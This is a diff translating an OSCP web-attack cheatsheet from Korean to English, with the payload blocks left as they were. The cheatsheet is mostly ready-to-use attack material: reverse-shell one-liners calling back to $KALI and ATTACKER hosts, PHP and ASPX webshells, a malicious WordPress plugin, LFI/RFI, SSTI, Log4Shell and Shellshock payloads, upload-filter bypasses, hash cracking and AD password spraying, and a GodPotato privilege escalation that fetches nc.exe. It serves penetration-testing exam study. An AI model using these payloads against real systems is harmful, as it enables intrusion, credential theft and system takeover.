@@ -1,21 +1,21 @@
 ---
-title: "웹 공격 (Web Attacks)"
+title: "Web Attacks"
 date: 2026-06-20
 weight: 30
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "디렉터리 브루트포싱, CMS, LFI, 파일 업로드, SSTI, XXE까지 웹 공격 전반을 다루는 체크리스트."
+summary: "A checklist covering directory brute forcing, CMS, LFI, file upload, SSTI, and XXE."
 ---
 
-웹 포트를 찾은 순간부터 돌리는 체크리스트. 디렉터리 브루트포싱, CMS, LFI, 파일 업로드, SSTI, XXE, DNN까지 웹 공격 전반을 다룬다.
+A checklist to run the moment you find a web port. Covers directory brute forcing, CMS, LFI, file upload, SSTI, XXE, and DNN.
 
-- 출처: https://heretek.dev/oscp-cheatsheet/web-attacks/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
-- 변수: `$ip` = 대상 웹 서버 IP (같은 의미로 혼용), 본문의 `ATTACKER`/`CALLBACK`은 자리표시자
+- Source: https://heretek.dev/oscp-cheatsheet/web-attacks/ (Jean Romero) — Reconstructed
+- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
+- Variables: `$ip` = target web server IP (used interchangeably), `ATTACKER`/`CALLBACK` in the text are placeholders
 
-## 정찰과 디렉터리 탐색 (Reconnaissance and Directory Discovery)
+## Reconnaissance and Directory Discovery
 
-웹 포트를 찾는 즉시 병렬로 실행한다:
+Run these in parallel as soon as you find a web port:
 
 ```bash
 # Quick hits + common files
@@ -33,15 +33,15 @@ ffuf -ac -t 60 -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/r
 ffuf -u http://$ip/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
 ```
 
-스탠드얼론 웹 타깃에서는 아래 우선순위대로 전부 실행한다:
+On a standalone web target, run all of these in priority order:
 
-1. `raft-medium-directories.txt` — 빠른 1차 패스
-2. `raft-large-directories.txt` — 대소문자 혼합. `/CHANGELOG`, `/Admin`, `/API`를 잡아낸다
-3. `raft-large-files.txt` — 확장자 인지
-4. `directory-list-2.3-medium.txt` — dirbuster 클래식
-5. `common.txt` — 최후의 백업
+1. `raft-medium-directories.txt` — fast first pass
+2. `raft-large-directories.txt` — mixed case. Catches `/CHANGELOG`, `/Admin`, `/API`
+3. `raft-large-files.txt` — extension aware
+4. `directory-list-2.3-medium.txt` — dirbuster classic
+5. `common.txt` — last-resort backup
 
-일반적인 dev/info 파일은 대소문자 변형까지 수동으로 항상 확인한다:
+Always check common dev/info files manually, including case variants:
 
 ```bash
 for path in CHANGELOG README LICENSE VERSION TODO NOTES changelog readme; do
@@ -49,13 +49,13 @@ for path in CHANGELOG README LICENSE VERSION TODO NOTES changelog readme; do
 done
 ```
 
-AD 사용자명 열거용 직원 이름 목록 생성:
+Building an employee name list for AD username enumeration:
 
 ```bash
 username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstlast > usernames.txt
 ```
 
-항상 수동으로 확인:
+Always check manually:
 
 ```bash
 curl http://$ip/robots.txt
@@ -67,11 +67,11 @@ curl http://$ip/wp-config.php.bak
 curl http://$ip/phpinfo.php
 ```
 
-모든 페이지에서 소스 보기: HTML 주석(크리덴셜/경로), 숨겨진 폼 필드, API 엔드포인트가 담긴 JS 파일, 버전 정보, 어드민 패널 링크를 찾는다.
+View source on every page: look for HTML comments (credentials/paths), hidden form fields, JS files containing API endpoints, version information, and admin panel links.
 
 ## POST vs GET
 
-GET이 에러를 내거나 빈 응답이면 POST를 시도한다:
+If GET errors or returns an empty response, try POST:
 
 ```bash
 curl http://$ip:PORT/endpoint
@@ -86,9 +86,9 @@ curl http://$TARGET:33333/<endpoint>
 curl -s -i -X POST -H 'Content-Length: 0' http://$TARGET:<port>/<endpoint>
 ```
 
-교훈: 고 포트 API(예: 33333)가 GET에서는 아무 응답이 없었다. Content-Length 헤더를 넣은 POST로 프로세스 목록이 노출됐고, 그 안에 하드코딩된 크리덴셜이 있었다. GET이 비어 보이면 항상 POST를 시도한다.
+Lesson: a high-port API (e.g. 33333) returned nothing on GET. A POST with a Content-Length header exposed a process list, which contained hardcoded credentials. If GET looks empty, always try POST.
 
-### LFI → RCE 리버스 셸 (알려진/업로드된 PHP 셸 경유)
+### LFI → RCE reverse shell (through a known/uploaded PHP shell)
 
 ```bash
 # bash reverse shell through the shell's cmd parameter
@@ -107,7 +107,7 @@ curl -sG "http://$TARGET/index.php" \
   --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 443 >/tmp/f"
 ```
 
-아웃바운드가 필터링돼 있으면 어떤 이그레스 포트가 열려 있는지 먼저 찾고, 그 포트로 셸을 쏜다:
+If outbound traffic is filtered, first find which egress port is open, then fire the shell on that port:
 
 ```bash
 # 1. Listen on Kali for probes
@@ -122,7 +122,7 @@ echo -n 'bash -i >& /dev/tcp/$KALI/443 0>&1' | base64
 rlwrap nc -lvnp 443
 ```
 
-## CMS 식별과 익스플로잇 (CMS Identification and Exploitation)
+## CMS Identification and Exploitation
 
 ```bash
 wpscan --url http://$ip --enumerate p --plugins-detection aggressive
@@ -130,36 +130,36 @@ droopescan scan drupal -u http://$ip
 joomscan --url http://$ip
 ```
 
-모든 CMS 공통: `searchsploit <CMS> <version>` → 비인증 익스플로잇부터 확인한다.
+For any CMS: `searchsploit <CMS> <version>` → check unauthenticated exploits first.
 
-## WordPress 익스플로잇 (WordPress Exploitation)
+## WordPress Exploitation
 
-체인: WordPress → wp-config.php → MySQL → 해시 덤프 → 크랙 → AD 스프레이
+Chain: WordPress → wp-config.php → MySQL → dump hashes → crack → AD spray
 
-### Phase 0 — /etc/hosts에 호스트명 추가
+### Phase 0 — Add the hostname to /etc/hosts
 
 ```bash
 # WordPress often redirects to a hostname — map it so links/wp-json resolve
 echo "$ip wordpress.local" | sudo tee -a /etc/hosts
 ```
 
-### Phase 1 — WPScan 열거
+### Phase 1 — WPScan enumeration
 
 ```bash
 wpscan --url http://TARGET --enumerate p,t,u --plugins-detection aggressive
 curl http://TARGET/wp-json/wp/v2/users
 ```
 
-### Phase 2 — WordPress 로그인 브루트포스
+### Phase 2 — WordPress login brute force
 
 ```bash
 wpscan --url http://TARGET --password-attack xmlrpc -U admin -P /path/to/wordlist -t 30
 ```
 
-### Phase 3 — WordPress 어드민 → 셸 (5가지 방법)
+### Phase 3 — WordPress admin → shell (5 methods)
 
-1. 테마 에디터 (404.php) → `http://TARGET/wp-content/themes/THEME_NAME/404.php`
-2. 악성 플러그인 업로드 — 아래 내용으로:
+1. Theme editor (404.php) → `http://TARGET/wp-content/themes/THEME_NAME/404.php`
+2. Upload a malicious plugin — with this content:
 
 ```text
 <?php
@@ -171,22 +171,22 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
 ?>
 ```
 
-   이어서: `zip revshell.zip revshell.php` → Plugins → Add New → Upload → Activate
+   Then: `zip revshell.zip revshell.php` → Plugins → Add New → Upload → Activate
 3. Metasploit → `exploit/unix/webapp/wp_admin_shell_upload`
-4. 플러그인 에디터 → 기존 플러그인 PHP 파일 수정
-5. 빠른 웹셸:
+4. Plugin editor → modify an existing plugin PHP file
+5. Quick webshell:
 
 ```text
 <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; die; } ?>
 ```
 
-### Phase 4 — wp-config.php → MySQL → 크리덴셜 덤프
+### Phase 4 — wp-config.php → MySQL → credential dump
 
 ```bash
 cat /var/www/html/wp-config.php
 ```
 
-### Phase 5 — MySQL DB 익스플로잇
+### Phase 5 — MySQL DB exploitation
 
 ```sql
 mysql -u DB_USER -p'DB_PASS' -h localhost DB_NAME
@@ -194,33 +194,33 @@ SELECT user_login, user_pass FROM wp_users;
 SELECT concat_ws(':', user_login, user_pass) FROM wp_users;
 ```
 
-### Phase 6 — WordPress 해시 크랙
+### Phase 6 — Cracking WordPress hashes
 
 ```bash
 hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
 john --format=phpass hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-### Phase 7 — AD 스프레이
+### Phase 7 — AD spray
 
 ```bash
 nxc smb DC_IP -u userlist.txt -p 'wordpress_password' --continue-on-success
 nxc winrm DC_IP -u username -p 'cracked_wp_hash'
 ```
 
-## 인증 테스트 (Authentication Testing)
+## Authentication Testing
 
-모든 로그인에 시도: `admin:admin`, `admin:password`, `admin:Password1`, `root:root`, `tomcat:s3cret`, `postgres:postgres`, `sa:sa`, `Company2024!`
+Try on every login: `admin:admin`, `admin:password`, `admin:Password1`, `root:root`, `tomcat:s3cret`, `postgres:postgres`, `sa:sa`, `Company2024!`
 
 ## SQLi
 
-범위: 탐지 체크리스트(7개 테스트), 인증 우회, 에러 기반(MySQL/MSSQL/PostgreSQL), UNION 기반(전체 DB), stacked queries → xp_cmdshell RCE, blind(boolean·time), Python 추출 스크립트, INTO OUTFILE 웹셸, WAF 우회. 상세는 [sql-injection.md](sql-injection.md).
+Scope: detection checklist (7 tests), authentication bypass, error-based (MySQL/MSSQL/PostgreSQL), UNION-based (full DB), stacked queries → xp_cmdshell RCE, blind (boolean/time), Python extraction scripts, INTO OUTFILE webshell, WAF bypass. See [sql-injection.md](sql-injection.md) for details.
 
-MSSQL(IIS + ASP.NET)이면 stacked queries를 먼저: `'; WAITFOR DELAY '0:0:5'--` — 지연되면 UNION은 버리고 바로 xp_cmdshell로 간다.
+For MSSQL (IIS + ASP.NET), try stacked queries first: `'; WAITFOR DELAY '0:0:5'--` — if it delays, skip UNION and go straight to xp_cmdshell.
 
 ## LFI
 
-테스트 페이로드:
+Test payloads:
 
 ```text
 ?page=../../../etc/passwd
@@ -232,7 +232,7 @@ curl -s "http://target/index.php?file=....//....//....//etc/passwd"
 ?page=data://text/plain,<?php system('id'); ?>
 ```
 
-Windows LFI 경로:
+Windows LFI paths:
 
 ```text
 ?page=C:/windows/system32/drivers/etc/hosts
@@ -240,7 +240,7 @@ Windows LFI 경로:
 ?page=C:/xampp/apache/conf/httpd.conf
 ```
 
-Windows LFI로 읽을 파일 (우선순위):
+Files to read via Windows LFI (priority):
 
 ```text
 C:/xampp/htdocs/dashboard/phpinfo.php
@@ -253,26 +253,26 @@ C:/windows/system32/drivers/etc/hosts
 C:/xampp/htdocs/wp-config.php
 ```
 
-### 웹 루트 위치 (Web Root Locations)
+### Web Root Locations
 
 - Apache (XAMPP) / Windows → `C:\xampp\htdocs\`
 - Apache / Linux → `/var/www/html/`
 - IIS / Windows → `C:\inetpub\wwwroot\`
 - nginx / Linux → `/var/www/html/`
-- Tomcat / 공통 → `webapps/`
+- Tomcat / common → `webapps/`
 
 ### LFI → RCE
 
-- 로그 포이즈닝: User-Agent에 `<?php system($_GET['cmd']); ?>` 주입 → `/var/log/apache2/access.log` 인클루드
+- Log poisoning: inject `<?php system($_GET['cmd']); ?>` into User-Agent → include `/var/log/apache2/access.log`
 
-PHP 래퍼:
+PHP wrappers:
 
 ```text
 ?page=php://input    (POST: <?php system('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'); ?>)
 ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami
 ```
 
-SSH 등 어떤 셸이라도 이미 있고 localhost 서비스에 LFI가 발견됐다면, PHP 웹셸을 쓰고 LFI로 인클루드한다:
+If you already have any shell (SSH, etc.) and find LFI in a localhost service, write a PHP webshell and include it via LFI:
 
 ```bash
 # Write webshell to a writable directory
@@ -281,20 +281,20 @@ echo '<?php system($_GET["cmd"]); ?>' > /dev/shm/shell.php
 curl "http://127.0.0.1:8000/backend/?view=../../../../../dev/shm/shell.php&cmd=id"
 ```
 
-쓰기 가능 디렉터리 시도 순서:
+Writable directories to try, in order:
 
-1. `/dev/shm` — 공유 메모리, 전역 쓰기 가능, noexec 없음 (최선)
-2. `/var/tmp` — 재부팅 후에도 유지
-3. `/tmp` — noexec 마운트인 경우가 있어 마지막에 시도
-4. `/run/shm` — 일부 배포판에서 /dev/shm의 별칭
+1. `/dev/shm` — shared memory, world-writable, not noexec (best)
+2. `/var/tmp` — survives reboot
+3. `/tmp` — sometimes mounted noexec, try last
+4. `/run/shm` — alias for /dev/shm on some distros
 
-### RFI (allow_url_include=On인 경우)
+### RFI (when allow_url_include=On)
 
 ```text
 ?page=http://ATTACKER/shell.php
 ```
 
-## 커맨드 인젝션 (Command Injection)
+## Command Injection
 
 ```text
 ; whoami
@@ -306,13 +306,13 @@ $(whoami)
 %0a whoami
 ```
 
-Blind 확인: `; ping -c 3 ATTACKER_IP` → `sudo tcpdump -i tun0 icmp`
+Blind check: `; ping -c 3 ATTACKER_IP` → `sudo tcpdump -i tun0 icmp`
 
-## 파일 업로드 (File Upload)
+## File Upload
 
-순서대로 시도: 정상 확장자 → 대체 확장자(`.phtml`, `.php5`) → 이중 확장자(`shell.php.jpg`) → 널 바이트(`shell.php%00.jpg`) → Content-Type 스푸핑 → 매직 바이트(`GIF89a`) → `.htaccess` 트릭 → 대소문자 변형 → IIS 트릭(`shell.asp;.jpg`)
+Try in order: normal extension → alternative extension (`.phtml`, `.php5`) → double extension (`shell.php.jpg`) → null byte (`shell.php%00.jpg`) → Content-Type spoofing → magic bytes (`GIF89a`) → `.htaccess` trick → case variants → IIS trick (`shell.asp;.jpg`)
 
-최소 웹셸:
+Minimal webshell:
 
 ```text
 <?php system($_GET['cmd']); ?>
@@ -324,7 +324,7 @@ Blind 확인: `; ping -c 3 ATTACKER_IP` → `sudo tcpdump -i tun0 icmp`
 
 ## SSTI
 
-탐지: `${{ <%[%'"}}%\` → 이어서 `{{7*7}}` → 49가 나오면 Jinja2/Twig, `${7*7}` → FreeMarker
+Detection: `${{ <%[%'"}}%\` → then `{{7*7}}` → 49 means Jinja2/Twig, `${7*7}` → FreeMarker
 
 Jinja2 RCE:
 
@@ -338,18 +338,18 @@ Twig RCE:
 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
 ```
 
-## Java 백엔드 RCE (Tomcat / Spring / JBoss / Struts)
+## Java Backend RCE (Tomcat / Spring / JBoss / Struts)
 
-백엔드가 Java라는 징후:
+Signs the backend is Java:
 
-- nmap이 `Apache Tomcat`, `Jetty`, `JBoss`, `WebLogic` 표시
-- nmap favicon 라인: `Spring Java Framework`
-- HTTP 헤더: `X-Powered-By: Servlet`, `Server: Apache-Coyote`
-- 쿠키: `JSESSIONID`
-- API 엔드포인트가 `Content-Type: text/plain;charset=UTF-8`로 응답 (Tomcat 기본값)
-- 확장자 `.jsp`, `.do`, `.action`
+- nmap shows `Apache Tomcat`, `Jetty`, `JBoss`, `WebLogic`
+- nmap favicon line: `Spring Java Framework`
+- HTTP headers: `X-Powered-By: Servlet`, `Server: Apache-Coyote`
+- Cookies: `JSESSIONID`
+- API endpoints respond with `Content-Type: text/plain;charset=UTF-8` (Tomcat default)
+- Extensions `.jsp`, `.do`, `.action`
 
-퍼징 목록 — 리플렉트되는 파라미터, 헤더, User-Agent, Cookie에 하나씩 넣어 본다. DNS 콜백 또는 sleep/지연을 관찰한다:
+Fuzzing list — try each in reflected parameters, headers, User-Agent, and Cookie. Watch for DNS callbacks or sleep/delay:
 
 ```text
 ${jndi:ldap://CALLBACK/x}                                          # Log4Shell - CVE-2021-44228
@@ -362,18 +362,18 @@ T(java.lang.Runtime).getRuntime().exec("sleep 10")                 # Spring SpEL
 class.module.classLoader.URLs[0]=                                  # Spring4Shell - CVE-2022-22965
 ```
 
-페이로드가 반응하면(지연/콜백) 전체 RCE 문법은 아래에서 찾는다:
+If a payload reacts (delay/callback), find the full RCE syntax here:
 
-- HackTricks: book.hacktricks.wiki (Java RCE / Tomcat / Spring 페이지)
-- PayloadsAllTheThings: github.com/swisskyrepo/PayloadsAllTheThings (Java 페이지)
+- HackTricks: book.hacktricks.wiki (Java RCE / Tomcat / Spring pages)
+- PayloadsAllTheThings: github.com/swisskyrepo/PayloadsAllTheThings (Java page)
 
-그 외 확인할 Java 진입점:
+Other Java entry points to check:
 
-- Tomcat manager: `/manager/html` + 기본 크리덴셜 (`tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`) → WAR 업로드
+- Tomcat manager: `/manager/html` + default credentials (`tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`) → WAR upload
 - Spring Actuator: `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`
 - JBoss: `/jmx-console`, `/web-console`, `/invoker/JMXInvokerServlet`
 
-DNS 콜백 준비 (시험 중에는 인터넷이 없다 — 로컬 전용):
+Preparing a DNS callback (no internet during the exam — local only):
 
 ```bash
 # Listen for DNS lookups from target on tun0
@@ -406,67 +406,67 @@ curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1" htt
 ?url=file:///etc/passwd
 ```
 
-## URL 쿼리 파라미터를 입력으로 쓰기
+## Using URL query parameters as input
 
-`?`가 쿼리 스트링의 시작이다. `http://target/?whoami` = `?` 뒤가 명령이다.
+`?` starts the query string. `http://target/?whoami` = the part after `?` is the command.
 
-## DotNetNuke (DNN) 익스플로잇
+## DotNetNuke (DNN) Exploitation
 
-### 식별 (Recognition)
+### Recognition
 
-- DNN 브랜딩이 있는 /Login 페이지
-- URL에 Portals/0/
-- HTTP 응답 헤더에 DNN 또는 DotNetNuke 언급
-- 기본 포털 디렉터리: /Portals/0/
+- A /Login page with DNN branding
+- Portals/0/ in the URL
+- DNN or DotNetNuke mentioned in HTTP response headers
+- Default portal directory: /Portals/0/
 
-### 기본 크리덴셜 (Default Credentials)
+### Default Credentials
 
 ```text
 admin : password
 host : dnnhost
 ```
 
-무엇보다 먼저 /Login에서 이것들을 시도한다.
+Try these on /Login before anything else.
 
-### 기본 크리덴셜이 변경됐다면: MSSQL 패스워드 확인
+### If the default credentials were changed: check the MSSQL password
 
 ```sql
 SELECT * FROM dbo.aspnet_Membership;
 ```
 
-- 패스워드를 SQL로 업데이트하는 건 salt+PBKDF2 때문에 까다롭다.
-- 더 쉬운 방법: HostSettings 테이블에서 어드민 계정 잠금 상태를 확인한다.
+- Updating the password via SQL is tricky because of salt+PBKDF2.
+- Easier: check the admin account lock status in the HostSettings table.
 
-### 포스트 인증 익스플로잇: 파일 업로드 확장자 우회
+### Post-auth exploitation: file upload extension bypass
 
-DNN은 기본적으로 .aspx 업로드를 막는다. aspx 웹셸을 올리려면:
+DNN blocks .aspx uploads by default. To upload an aspx webshell:
 
-1. /Login에서 admin으로 로그인
+1. Log in as admin at /Login
 2. Persona Bar → Settings → Security → More → More Security Settings
-3. 'Allowable File Extensions' 찾기 (HostSettings 테이블, SettingName='FileExtensions')
-4. 쉼표 목록에 'aspx' 추가
-5. 저장
+3. Find 'Allowable File Extensions' (HostSettings table, SettingName='FileExtensions')
+4. Add 'aspx' to the comma-separated list
+5. Save
 
 ```sql
 UPDATE HostSettings SET SettingValue = 'bmp,gif,ico,jpeg,jpg,jpe,png,svg,aspx,asp,ashx' WHERE SettingName = 'FileExtensions';
 ```
 
-### 웹셸 업로드
+### Upload the webshell
 
-- Admin → File Management → cmdasp.aspx 업로드
-- 또는 Persona Bar → File Management
+- Admin → File Management → upload cmdasp.aspx
+- Or Persona Bar → File Management
 
-### 웹셸 접근
+### Access the webshell
 
 ```text
 http://TARGET/Portals/0/cmdasp.aspx
 ```
 
-포털 ID 0이 기본 포털의 업로드 루트다. 다른 포털은 /Portals/1/ 등에 위치한다.
+Portal ID 0 is the upload root of the default portal. Other portals live under /Portals/1/ etc.
 
-### 웹셸에서 권한 상승 (Privesc from Webshell)
+### Privesc from Webshell
 
-IIS AppPool 신원은 SeImpersonatePrivilege를 가진다. GodPotato 또는 PrintSpoofer로 SYSTEM까지 간다.
+The IIS AppPool identity holds SeImpersonatePrivilege. Go to SYSTEM with GodPotato or PrintSpoofer.
 
 ```bash
 whoami /priv
@@ -477,9 +477,9 @@ powershell -c "iwr http://KALI/nc.exe -o C:\Windows\Temp\nc.exe"
 C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe KALI 4444 -e cmd.exe"
 ```
 
-전형적 체인: /Login 기본 크리덴셜 → aspx 확장자 허용 목록 우회 → 웹셸 → SeImpersonate privesc (GodPotato/PrintSpoofer) → SYSTEM
+Typical chain: /Login default credentials → aspx extension allowlist bypass → webshell → SeImpersonate privesc (GodPotato/PrintSpoofer) → SYSTEM
 
-## 빠른 참조 링크 (같은 폴더 문서)
+## Quick Links (documents in the same folder)
 
-- 전체 흐름 → [methodology.md](methodology.md)
-- SQL 인젝션 상세 → [sql-injection.md](sql-injection.md)
+- Full workflow → [methodology.md](methodology.md)
+- SQL injection details → [sql-injection.md](sql-injection.md)
